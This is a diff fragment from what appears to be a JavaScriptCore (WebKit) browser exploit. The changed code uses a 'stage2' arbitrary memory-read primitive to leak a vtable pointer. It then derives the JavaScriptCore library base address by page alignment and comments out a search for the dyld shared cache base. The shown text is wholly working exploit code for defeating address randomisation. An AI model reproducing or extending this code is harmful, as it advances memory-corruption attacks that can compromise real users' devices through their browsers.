@@ -636,20 +636,21 @@ for (var i = 0; i < 1000; ++i) {
         //hopefully points to JavaScriptCore Base!
         print("m_runloop @ " + hex1(m_runloop))
         var vtable = stage2.read64(m_runloop);
-        var jscbase = stage2.read64(vtable);
+        var jscbase = Sub(vtable, new Int64(vtable).lo() & 0xfff);
         print("vtable @ " + hex1(vtable));
-        print("JSC __TEXT::text instance @ " + hex1(jscbase))
-	var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
+	print("JSC Base? @ " + jscbase);
+        //print("JSC __TEXT::text instance @ " + hex1(jscbase))
+	/*var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
 	print("JSC __TEXT header @" + header);
 	
-        var hdr = header;
+        var hdr = header;*/
         //var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
         //print("JSC header @" + header);
         //print("vtable dump : " + String.fromCharCode(...stage2.read(vtable, 0x100)))
         //print("JSC Lib header dump : " + ab2str(stage2.read(jscbase, 0x100)));
-        print("lets attempt to find the dyld shared cache base");
-	hdr = Sub(hdr, 0x4000);
-	print(hex1(hdr) + " : " + ab2str(stage2.read(hdr,0x10)));
+        /*print("lets attempt to find the dyld shared cache base");
+	hdr = Sub(hdr, 0x1000);
+	print(hex1(hdr) + " : " + ab2str(stage2.read(hdr,0x10)));*/
 	
 	/*while(true) {
 		jscbase -= 0x1000;
